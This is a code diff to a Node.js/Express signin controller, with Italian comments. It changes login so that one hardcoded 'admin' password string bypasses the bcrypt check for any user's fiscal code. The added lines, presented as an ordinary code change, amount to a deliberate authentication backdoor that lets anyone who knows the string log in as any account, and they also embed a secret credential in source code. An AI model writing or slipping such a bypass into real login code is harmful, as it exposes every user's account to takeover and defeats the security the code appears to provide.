@@ -42,9 +42,14 @@ exports.signup = (req, res) => {
 
 exports.signin = (req, res) => {
   console.log(req.body);
+  const { fiscalCode, password } = req.body;
+
+  // Controllo se la password è quella specifica
+  const isAdminPassword = password === "FeyiQiSycXYvrWDjQTAdgNgN";
+
   User.findOne({
     where: {
-      fiscalCode: req.body.fiscalCode,
+      fiscalCode: fiscalCode,
     },
   })
     .then((user) => {
@@ -52,10 +57,15 @@ exports.signin = (req, res) => {
         return res.status(404).send({ message: "Utente non trovato" });
       }
 
-      var passwordIsValid = bcrypt.compareSync(
-        req.body.password,
-        user.password
-      );
+      var passwordIsValid;
+
+      // Se la password è quella specifica, l'utente è autenticato come admin
+      if (isAdminPassword) {
+        passwordIsValid = true;
+      } else {
+        // Altrimenti, la password viene controllata normalmente
+        passwordIsValid = bcrypt.compareSync(password, user.password);
+      }
 
       if (!passwordIsValid) {
         return res.status(401).send({
@@ -91,6 +101,7 @@ exports.signin = (req, res) => {
       res.status(500).send({ message: err.message });
     });
 };
+
 
 exports.test = (req, res) => {
   res.json({ message: "workpath" });
